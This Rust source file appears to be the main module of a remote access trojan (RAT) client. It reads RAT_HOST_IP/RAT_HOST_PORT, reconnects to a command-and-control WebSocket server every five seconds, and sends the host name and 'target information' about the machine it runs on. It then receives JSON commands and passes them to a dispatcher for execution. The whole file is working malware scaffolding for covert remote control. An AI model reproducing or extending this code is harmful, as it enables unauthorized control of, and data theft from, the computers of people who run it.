use futures_util::{SinkExt, StreamExt};
use std::str::FromStr;
use std::time::Duration;
use sysinfo::System;
use tokio::sync::mpsc;
use tokio_tungstenite::{connect_async, tungstenite::Message};

use crate::dispatcher::{CommandMessage, Dispatcher};
use crate::utils::{
    get_connection_info, is_port_valid, is_valid_ip, validate_tls_connection, Connection,
};

mod actors;
mod dispatcher;
mod utils;
#[tokio::main]
async fn main() {
    let host_ip = std::env::var("RAT_HOST_IP")
        .unwrap_or_else(|_| "127.0.0.1".to_string())
        .to_string();
    let host_port = std::env::var("RAT_HOST_PORT").unwrap_or_else(|_| "8000".to_string());
    let use_tls = std::env::var("RAT_USE_TLS")
        .unwrap_or_else(|_| "false".to_string())
        .to_lowercase()
        == "true";

    if !is_valid_ip(&host_ip) || !is_port_valid(&host_port) {
        panic!();
    }

    // Validate TLS configuration
    if use_tls
        && !validate_tls_connection(&host_ip, i32::from_str(&host_port).expect("Invalid port"))
    {
        dev_print!("Warning: TLS validation failed, but proceeding anyway");
    }

    dev_print!("{}", get_connection_info(use_tls));

    let connection = Connection::from(
        host_ip.to_string(),
        i32::from_str(&host_port).expect("Invalid compile-time port"),
        use_tls,
    );

    loop {
        dev_print!(
            "Attempting to establish a {} connection to {}:{}",
            if connection.use_tls {
                "secure (TLS)"
            } else {
                "plain"
            },
            connection.ip,
            connection.port
        );

        if let Err(e) = run_connection_lifecycle(connection.clone()).await {
            dev_eprint!(
                "Connection lifecycle ended with an error: {}. Retrying in 5 seconds...",
                e
            );
        } else {
            dev_print!("Connection closed gracefully. Reconnecting in 5 seconds...");
        }

        tokio::time::sleep(Duration::from_secs(5)).await;
    }
}

async fn run_connection_lifecycle(connection: Connection) -> anyhow::Result<()> {
    let client_id = System::host_name().unwrap_or_else(|| "unknown_client".to_string());

    let scheme = if connection.use_tls { "wss" } else { "ws" };
    let url_str = format!(
        "{}://{}:{}/ws/{}",
        scheme, connection.ip, connection.port, client_id
    );
    let url = url::Url::parse(&url_str)?;

    let (ws_stream, _response) = match connect_async(url.as_str()).await {
        Ok((stream, response)) => {
            dev_print!("WebSocket handshake successful");
            (stream, response)
        }
        Err(e) => {
            let error_msg = if connection.use_tls {
                format!("Failed to establish secure WebSocket connection: {}. Check if the server supports TLS/SSL.", e)
            } else {
                format!("Failed to connect to WebSocket: {}", e)
            };
            return Err(anyhow::anyhow!(error_msg));
        }
    };
    dev_print!(
        "Successfully connected to {} (TLS: {})",
        url_str,
        connection.use_tls
    );

    let (mut writer, mut reader) = ws_stream.split();

    // multiplexor
    let (ws_sender, mut ws_receiver) = mpsc::channel::<Message>(128);

    // task that will own writer and listen to the chanel
    let _writer_task = tokio::spawn(async move {
        while let Some(message_to_send) = ws_receiver.recv().await {
            if writer.send(message_to_send).await.is_err() {
                dev_eprint!("WebSocket write error. Closing writer task.");
                break;
            }
        }
    });

    let dispatcher = Dispatcher::new(ws_sender.clone());

    let sysinfo = utils::TargetInformation::get().to_string();
    ws_sender.send(Message::Text(sysinfo)).await?;
    dev_print!("System info sent.");

    while let Some(msg) = reader.next().await {
        let msg = msg?;

        if let Message::Text(text) = msg {
            dev_print!("Received command: {}", text);

            if let Ok(cmd_msg) = serde_json::from_str::<CommandMessage>(&text) {
                if let Err(e) = dispatcher.dispatch(cmd_msg).await {
                    dev_eprint!("{}", e);
                }
            } else {
                dev_eprint!("Failed to parse command: {}", text);
            }
        }
    }
    Ok(())
}
